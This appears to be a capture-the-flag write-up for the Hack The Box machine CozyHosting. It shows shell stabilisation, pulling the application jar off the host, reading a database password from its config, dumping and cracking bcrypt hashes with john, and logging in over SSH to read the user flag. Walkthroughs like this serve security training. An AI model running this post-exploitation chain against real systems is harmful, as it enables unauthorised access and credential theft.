# Explanation
After getting the shell, I ran some command to stabilize my shell. After stabilizing my shell, I looked through the machine and transfer the jar file in the app folder to my machine and extract the file. After extracting the jar file, I went through and checked all the files and I found username and password for a postgres user. After getting the username password of postgres user, I decided to login and get access to that service and look forward. I got hashes of users password and I used john to decode the password and get user josh's password. After getting the password of the user, I ssh'ed into their account and got user.txt


# Stabilize shell
```
app@cozyhosting:/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@cozyhosting:/app$ export TERM=xterm
export TERM=xterm
app@cozyhosting:/app$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               stty rows 38 columns 116
app@cozyhosting:/app$ export TERM=xterm
app@cozyhosting:/app$ 
```

# Moving jar file
```
app@cozyhosting:/app$ python3 -m http.server 8083
Serving HTTP on 0.0.0.0 port 8083 (http://0.0.0.0:8083/) ...
10.10.16.2 - - [06/Sep/2023 01:38:17] "GET / HTTP/1.1" 200 -
10.10.16.2 - - [06/Sep/2023 01:38:18] code 404, message File not found
10.10.16.2 - - [06/Sep/2023 01:38:18] "GET /favicon.ico HTTP/1.1" 404 -
10.10.16.2 - - [06/Sep/2023 01:38:20] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
app@cozyhosting:/app$ ls -al
total 58856
drwxr-xr-x  2 root root     4096 Aug 14 14:11 .
drwxr-xr-x 19 root root     4096 Aug 14 14:11 ..
-rw-r--r--  1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar

```

# Extract files
```
──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# jar xvf cloudhosting-0.0.1.jar
  created: META-INF/
 inflated: META-INF/MANIFEST.MF
  created: org/
  created: org/springframework/
  created: org/springframework/boot/
  created: org/springframework/boot/loader/
 inflated: org/springframework/boot/loader/ClassPathIndexFile.class
 inflated: org/springframework/boot/loader/ExecutableArchiveLauncher.class
 inflated: org/springframework/boot/loader/JarLauncher.class
 inflated: org/springframework/boot/loader/LaunchedURLClassLoader$DefinePackageCallType.class
 inflated: org/springframework/boot/loader/LaunchedURLClassLoader$UseFastConnectionExceptionsEnumeration.class
 inflated: org/springframework/boot/loader/LaunchedURLClassLoader.class
 inflated: org/springframework/boot/loader/Launcher.class
 inflated: org/springframework/boot/loader/MainMethodRunner.class
 inflated: org/springframework/boot/loader/PropertiesLauncher$ArchiveEntryFilter.class
 inflated: org/springframework/boot/loader/PropertiesLauncher$ClassPathArchives.class
 inflated: org/springframework/boot/loader/PropertiesLauncher$PrefixMatchingArchiveFilter.class
 inflated: org/springframework/boot/loader/PropertiesLauncher.class

...

```

# Username and password
```
┌──(root㉿kali)-[~/…/hackthebox/CozyHosting/BOOT-INF/classes]
└─# cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

# postgres service
```
app@cozyhosting:/app$ psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres-# \list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres-# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting-# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

cozyhosting=# SELECT * FROM users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

# hash.txt
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# echo '$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim' >> hash.txt
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# cat hash.txt
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
```

# john
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# john --wordlist=/opt/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:03:33 0.10% (ETA: 2023-09-08 10:54) 0.004681g/s 78.70p/s 91.85c/s 91.85C/s tommylee..sandiego1
Use the "--show" option to display all of the cracked passwords reliably
Session aborted

```

# ssh
```
┌──(root㉿kali)-[~/Documents/Notes/hackthebox/CozyHosting]
└─# ssh josh@cozyhosting.htb
josh@cozyhosting.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep  6 02:08:43 AM UTC 2023

  System load:           0.0
  Usage of /:            53.5% of 5.42GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             241
  Users logged in:       0
  IPv4 address for eth0: 10.129.105.21
  IPv6 address for eth0: dead:beef::250:56ff:feb0:cc92


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$ cat user.txt
03d213d526fe72664d4e21d95987172c 
```